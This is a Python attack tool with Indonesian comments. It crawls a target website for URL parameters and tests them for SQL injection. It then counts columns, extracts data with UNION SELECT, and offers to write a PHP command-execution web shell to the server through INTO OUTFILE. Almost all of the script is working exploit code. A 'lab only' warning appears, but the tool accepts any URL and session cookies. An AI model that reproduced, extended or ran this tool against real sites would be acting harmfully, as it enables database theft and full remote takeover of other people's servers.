#!/usr/bin/env python3
# ============================================================
# TOOL: Auto Parameter Discovery + SQL Injection + Upload Shell
# Author: LabTester
# Input: URL dari user (contoh: https://fankynas.cloud)
# NOTE: HANYA UNTUK LAB / SISTEM SENDIRI
# ============================================================

import requests
import sys
import re
import urllib.parse
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse, parse_qs

# Warna
GREEN = "\033[92m"
RED = "\033[91m"
YELLOW = "\033[93m"
RESET = "\033[0m"

def info(msg):
    print(f"{GREEN}[INFO]{RESET} {msg}")

def error(msg):
    print(f"{RED}[ERROR]{RESET} {msg}")

def warn(msg):
    print(f"{YELLOW}[WARN]{RESET} {msg}")

def banner():
    print("""
--[MAI]--  
Author: AutoParamHunter  
Inspired By: sqlmap, muani injection tools  
""")

def get_all_links(base_url, cookies=None):
    """Mengambil semua link internal dari halaman utama"""
    links = set()
    try:
        r = requests.get(base_url, cookies=cookies, timeout=10, verify=False)
        soup = BeautifulSoup(r.text, 'html.parser')
        for a in soup.find_all('a', href=True):
            href = a['href']
            full_url = urljoin(base_url, href)
            if urlparse(full_url).netloc == urlparse(base_url).netloc:
                links.add(full_url)
        info(f"Ditemukan {len(links)} link internal")
    except Exception as e:
        error(f"Gagal crawl: {e}")
    return links

def extract_params_from_urls(urls):
    """Ekstrak semua URL yang memiliki parameter query"""
    param_urls = set()
    for url in urls:
        parsed = urlparse(url)
        if parsed.query:
            param_urls.add(url)
    return param_urls

def guess_param_urls(base_url):
    """Buat tebakan URL dengan parameter umum jika tidak ditemukan"""
    common_params = ['id', 'page', 'cat', 'product', 'post', 'news', 'detail', 'pid', 'cid', 'uid', 'user']
    guessed = set()
    for param in common_params:
        guessed.add(f"{base_url}?{param}=1")
    return guessed

def test_injection(url, param_name, param_value, cookies):
    """Uji apakah parameter vulnerable SQL injection"""
    payloads = ["'", "\"", "' AND '1'='1", "' OR '1'='1", " AND 1=1", " AND 1=2"]
    for p in payloads:
        test_url = url.replace(f"{param_name}={param_value}", f"{param_name}={param_value}{p}")
        try:
            r = requests.get(test_url, cookies=cookies, timeout=5, verify=False)
            if "mysql" in r.text.lower() or "syntax" in r.text.lower() or "sql" in r.text.lower() or "unclosed" in r.text.lower():
                info(f"Vulnerable: {param_name} dengan payload {p}")
                if "'" in p:
                    return "'"  # string based
                else:
                    return " AND "  # numeric based
            # Boolean based
            if p == " AND 1=1" or p == " AND 1=2":
                url1 = url.replace(f"{param_name}={param_value}", f"{param_name}={param_value} AND 1=1-- -")
                url2 = url.replace(f"{param_name}={param_value}", f"{param_name}={param_value} AND 1=2-- -")
                r1 = requests.get(url1, cookies=cookies, timeout=5, verify=False)
                r2 = requests.get(url2, cookies=cookies, timeout=5, verify=False)
                if len(r1.text) != len(r2.text):
                    info(f"Boolean based injection pada {param_name}")
                    return " AND "
        except:
            continue
    return None

def count_columns(url, param_name, param_value, inject_char, cookies):
    """Hitung jumlah kolom dengan ORDER BY"""
    for order in range(1, 20):
        payload = f"{param_value}{inject_char} ORDER BY {order}-- -"
        test_url = url.replace(f"{param_name}={param_value}", f"{param_name}={payload}")
        try:
            r = requests.get(test_url, cookies=cookies, timeout=5, verify=False)
            if r.status_code != 200 or "error" in r.text.lower() or "unknown" in r.text.lower():
                return order - 1
        except:
            return order - 1
    return 4

def union_extract(url, param_name, param_value, inject_char, num_cols, cookies):
    """Ekstrak data dengan UNION SELECT"""
    numbers = ','.join(str(i*11) for i in range(1, num_cols+1))
    payload = f"{param_value}{inject_char} UNION SELECT {numbers}-- -"
    test_url = url.replace(f"{param_name}={param_value}", f"{param_name}={payload}")
    info(f"Payload Union: {test_url}")
    try:
        r = requests.get(test_url, cookies=cookies, timeout=5, verify=False)
        pattern = r'\b(?:' + '|'.join(str(i*11) for i in range(1, num_cols+1)) + r')\b'
        found = re.findall(pattern, r.text)
        if found:
            info(f"Angka Yang Muncul: {', '.join(set(found))}")
            return True
    except:
        pass
    warn("Union gagal menampilkan angka. Mungkin kolom tidak cocok.")
    return False

def upload_shell(url, param_name, param_value, inject_char, num_cols, cookies, shell_path, shell_content):
    """Upload webshell via INTO OUTFILE"""
    safe_shell = shell_content.replace("'", "\\'")
    select_items = [f"'{safe_shell}'"] + [str(i) for i in range(2, num_cols+1)]
    payload = f"{param_value}{inject_char} UNION SELECT {','.join(select_items)} INTO OUTFILE '{shell_path}'-- -"
    test_url = url.replace(f"{param_name}={param_value}", f"{param_name}={payload}")
    info(f"Mengupload dios ke {shell_path}")
    try:
        r = requests.get(test_url, cookies=cookies, timeout=10, verify=False)
        if r.status_code == 200:
            info("Upload tampaknya berhasil. Cek file di server.")
            return True
    except:
        pass
    error("Upload gagal. Mungkin privilege MySQL tidak cukup.")
    return False

def main():
    banner()
    
    # Minta URL dari input user
    target_url = input("Masukkan URL target (contoh: https://fankynas.cloud): ").strip()
    if not target_url:
        error("URL tidak boleh kosong!")
        return
    
    base_url = target_url.rstrip('/')
    info(f"Memulai scanning di {base_url}")
    
    # Optional cookie
    cookies = {}
    if input("Butuh cookie session? (y/n): ").strip().lower() == 'y':
        cookie_str = input("Cookie string: ")
        for item in cookie_str.split(';'):
            if '=' in item:
                k,v = item.strip().split('=',1)
                cookies[k] = v
    
    # 1. Crawl dan cari parameter
    info("Mencari Parameter Pada Url...")
    links = get_all_links(base_url, cookies)
    param_urls = extract_params_from_urls(links)
    
    if not param_urls:
        warn("Tidak ditemukan parameter dari crawl. Mencoba tebakan parameter umum...")
        param_urls = guess_param_urls(base_url)
    
    if not param_urls:
        error("Tidak ada URL dengan parameter yang bisa diuji.")
        return
    
    info(f"Menemukan {len(param_urls)} URL dengan parameter untuk diuji")
    
    # 2. Uji setiap parameter
    vulnerable = None
    for full_url in param_urls:
        parsed = urlparse(full_url)
        params = parse_qs(parsed.query)
        for param_name, param_values in params.items():
            param_value = param_values[0]
            info(f"Menguji: {full_url}")
            inject_char = test_injection(full_url, param_name, param_value, cookies)
            if inject_char:
                vulnerable = (full_url, param_name, param_value, inject_char)
                info(f"Ditemukan injeksi pada {param_name} dengan tipe {inject_char}")
                break
        if vulnerable:
            break
    
    if not vulnerable:
        error("Tidak ada parameter yang vulnerable SQL injection.")
        return
    
    full_url, param_name, param_value, inject_char = vulnerable
    
    # 3. Hitung kolom
    num_cols = count_columns(full_url, param_name, param_value, inject_char, cookies)
    info(f"Jumlah Column: {num_cols}")
    
    # 4. Union extraction
    union_extract(full_url, param_name, param_value, inject_char, num_cols, cookies)
    
    # 5. Upload shell (opsional)
    if input("Upload shell? (y/n): ").strip().lower() == 'y':
        shell_path = input("Path absolut shell (contoh: /var/www/html/shell.php): ").strip()
        shell_content = '''<?php
if(isset($_REQUEST['cmd'])){
    echo "<pre>";
    system($_REQUEST['cmd']);
    echo "</pre>";
}
?>'''
        upload_shell(full_url, param_name, param_value, inject_char, num_cols, cookies, shell_path, shell_content)
    
    info("Selesai.")

if __name__ == "__main__":
    print(f"{RED}PERINGATAN: Hanya untuk testing di lab sendiri. Penggunaan ilegal melanggar hukum.{RESET}\n")
    main()
